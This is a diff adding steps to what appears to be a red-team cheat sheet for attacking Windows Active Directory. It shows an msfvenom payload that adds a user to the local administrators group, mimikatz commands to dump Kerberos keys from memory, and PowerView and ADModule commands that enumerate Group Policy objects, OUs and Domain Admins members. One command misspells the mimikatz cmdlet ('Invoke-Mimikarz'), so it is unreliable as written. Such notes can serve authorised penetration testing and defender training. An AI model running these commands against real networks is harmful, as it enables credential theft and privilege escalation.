@@ -120,3 +120,53 @@ Having write privileges on one of those folder, is possible to place an executab
 ```
 0xdemiafk@root# msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators redteamuser /add" -f exe > path.exe
 ```
+
+### Steal local keys with mimikatz (Using local administrator permission)
+
+```
+PS C:\Users\0xdemiafk\Documents\> Import-Module Mimikatz.ps1
+```
+
+```
+PS C:\Users\0xdemiafk\Documents\> Invoke-Mimikarz -Command "'sekurlsa::ekeys'"
+```
+
+
+## Step 03 - Active Directory enumeration
+
+>:warning: Don't try to get domain admin user quickly, rarely you can own a domain admin account.
+
+Enumerate all GPOs using "Restircted Groups"
+
+> :information_source: A Restricted Group is an object to represent a local group in a computer.
+
+```
+PS C:\Users\0xdemiafk\Documents\> Get-DomainGPOLocalGroup
+```
+
+Enumerate all members from a group (Using ADModule).
+
+```
+PS C:\Users\0xdemiafk\Documents\> Get-ADGroupMember "Domain Admins" -Recursive
+
+```
+
+Enumerate all OUs.
+
+```
+PS C:\Users\0xdemiafk\Documents\> Get-DomainOU
+```
+
+Enumerate OUs that contains "domain":
+
+```
+PS C:\Users\0xdemiafk\Documents\> Get-DomainOU -Identity "*domain*"
+```
+
+Enumerate GPO applied to an OU:
+
+```
+PS C:\Users\0xdemiafk\Documents\> Get-DomainGPO -Identity "{FCE16496-C744-4E46-AC89-2D01D76EAD68}"
+```
+
+
